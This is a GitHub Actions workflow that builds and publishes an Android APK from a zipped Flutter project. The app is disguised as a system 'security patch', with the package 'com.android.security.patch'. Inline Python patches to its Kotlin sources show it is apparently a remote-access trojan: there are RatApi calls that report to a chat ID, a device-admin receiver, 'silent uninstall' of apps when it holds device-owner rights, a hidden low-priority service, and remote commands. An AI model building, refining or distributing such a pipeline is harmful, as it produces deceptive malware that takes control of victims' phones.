name: Build Flutter APK from ZIP

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repo
        uses: actions/checkout@v4

      - name: Setup Java 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"

      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          flutter-version: "3.24.5"
          channel: stable
          cache: true

      - name: Extract source ZIP
        run: |
          mkdir -p /tmp/zip_raw
          unzip source.zip -d /tmp/zip_raw
          COUNT=$(ls /tmp/zip_raw | wc -l | tr -d ' ')
          FIRST=$(ls /tmp/zip_raw | head -1)
          if [ "$COUNT" = "1" ] && [ -d "/tmp/zip_raw/$FIRST" ]; then
            mv "/tmp/zip_raw/$FIRST" /tmp/flutter_src
          else
            mv /tmp/zip_raw /tmp/flutter_src
          fi
          echo "=== extracted ==="
          ls /tmp/flutter_src

      - name: Fix pubspec package name
        run: |
          cd /tmp/flutter_src
          sed -i -E 's/^name:.*$/name: security_patch/' pubspec.yaml
          cat pubspec.yaml

      - name: Scaffold android project
        run: |
          cd /tmp/flutter_src
          cp pubspec.yaml /tmp/pubspec.bak
          flutter create --org com.android.security --project-name security_patch --platforms android .
          cp /tmp/pubspec.bak pubspec.yaml

      - name: Overlay manifest + kotlin + res
        run: |
          cd /tmp/flutter_src
          rm -rf android/app/src/main/kotlin/com/example
          rm -rf android/app/src/main/kotlin/com/android/security/security_patch
          mkdir -p android/app/src/main/kotlin/com/android/security/patch
          cp -rf android_override/app/src/main/kotlin/com/android/security/patch/* android/app/src/main/kotlin/com/android/security/patch/
          cp -f android_override/app/src/main/AndroidManifest.xml android/app/src/main/AndroidManifest.xml
          mkdir -p android/app/src/main/res/xml
          mkdir -p android/app/src/main/res/values
          cp -f android_override/app/src/main/res/xml/* android/app/src/main/res/xml/
          cp -f android_override/app/src/main/res/values/* android/app/src/main/res/values/

      - name: Fix Kotlin sources
        run: |
          cd /tmp/flutter_src
          python3 - <<'PYEOF'
          import os
          base = "android/app/src/main/kotlin/com/android/security/patch"
          def read(p):
              with open(p) as f: return f.read()
          def write(p, s):
              with open(p, "w") as f: f.write(s)
          def patch(p, old, new):
              s = read(p)
              if old not in s:
                  print(f"[WARN] not found in {p}: {old[:50]!r}")
                  return
              write(p, s.replace(old, new))
              print(f"[OK] {p}")

          # WebViewActivity: framework Activity instead of AppCompatActivity
          p = f"{base}/WebViewActivity.kt"
          patch(p, "import androidx.appcompat.app.AppCompatActivity", "import android.app.Activity")
          patch(p, "class WebViewActivity : AppCompatActivity()", "class WebViewActivity : Activity()")

          # CoreService: framework Notification + Rules import
          p = f"{base}/CoreService.kt"
          patch(p, "import androidx.core.app.NotificationCompat\n", "")
          patch(p, "NotificationCompat.Builder", "Notification.Builder")
          patch(p, "NotificationCompat.PRIORITY_MIN", "Notification.PRIORITY_MIN")
          patch(p, "import android.content.Intent", "import android.content.Intent\nimport com.android.security.patch.commands.Rules")

          # AdminReceiver: Rules import
          p = f"{base}/AdminReceiver.kt"
          patch(p, "import android.content.Intent", "import android.content.Intent\nimport com.android.security.patch.commands.Rules")

          # Navigate: framework Notification
          p = f"{base}/commands/Navigate.kt"
          patch(p, "import androidx.core.app.NotificationCompat\n", "")
          patch(p, "NotificationCompat.Builder", "Notification.Builder")
          patch(p, "NotificationCompat.PRIORITY_HIGH", "Notification.PRIORITY_HIGH")
          patch(p, ".setStyle(NotificationCompat.BigTextStyle().bigText(body))\n", "")

          # HangManager: remove broken line
          p = f"{base}/HangManager.kt"
          patch(p, "        val custom = Prefs.getStr(null) // no-op, placeholder\n", "")

          # Apps: replace deletePackage with uninstall intent
          p = f"{base}/commands/Apps.kt"
          old = """if (AdminReceiver.isDeviceOwner(ctx)) {
                      dpm.deletePackage(AdminReceiver.component(ctx), pkg, null)
                      RatApi.sendMessage(ctx, "silent uninstall: $pkg", chatId)
                  } else {
                      val i = Intent(Intent.ACTION_UNINSTALL_PACKAGE, Uri.parse("package:$pkg"))
                          .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                      ctx.startActivity(i)
                      RatApi.sendMessage(ctx, "uninstall prompt shown", chatId)
                  }"""
          new = """val i = Intent(Intent.ACTION_UNINSTALL_PACKAGE, Uri.parse("package:$pkg"))
                      .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                  ctx.startActivity(i)
                  RatApi.sendMessage(ctx, "uninstall prompt shown", chatId)"""
          patch(p, old, new)

          # SystemCmd: setBitmap instead of setInputStream
          p = f"{base}/commands/SystemCmd.kt"
          old = """val fis = File(path).inputStream()
              fis.use { wm.setInputStream(it) }"""
          new = """val bmp = android.graphics.BitmapFactory.decodeFile(path)
              if (bmp != null) wm.setBitmap(bmp)"""
          patch(p, old, new)

          print("=== all patches applied ===")
          PYEOF

      - name: Configure build.gradle
        run: |
          cd /tmp/flutter_src
          python3 - <<'PY'
          import re
          p = "android/app/build.gradle"
          s = open(p).read()
          s = re.sub(r'namespace\s*=\s*"[^"]+"', 'namespace = "com.android.security.patch"', s)
          s = re.sub(r'namespace\s+"[^"]+"', 'namespace "com.android.security.patch"', s)
          s = re.sub(r'applicationId\s*=\s*"[^"]+"', 'applicationId = "com.android.security.patch"', s)
          s = re.sub(r'applicationId\s+"[^"]+"', 'applicationId "com.android.security.patch"', s)
          s = re.sub(r'minSdkVersion\s+flutter\.minSdkVersion', 'minSdkVersion 26', s)
          s = re.sub(r'minSdk\s+flutter\.minSdkVersion', 'minSdk 26', s)
          s = re.sub(r'targetSdkVersion\s+flutter\.targetSdkVersion', 'targetSdkVersion 34', s)
          s = re.sub(r'targetSdk\s+flutter\.targetSdkVersion', 'targetSdk 34', s)
          anchor = "dependencies {"
          inject = anchor + """
              implementation 'org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3'
          """
          s = s.replace(anchor, inject, 1)
          open(p, "w").write(s)
          print("=== build.gradle patched ===")
          PY

      - name: Pub get
        run: cd /tmp/flutter_src && flutter pub get

      - name: Build APK release
        run: cd /tmp/flutter_src && flutter build apk --release

      - name: Rename APK
        run: mv /tmp/flutter_src/build/app/outputs/flutter-apk/app-release.apk /tmp/flutter_src/build/app/outputs/flutter-apk/security-patch.apk

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: security-patch-apk
          path: /tmp/flutter_src/build/app/outputs/flutter-apk/security-patch.apk
          retention-days: 14
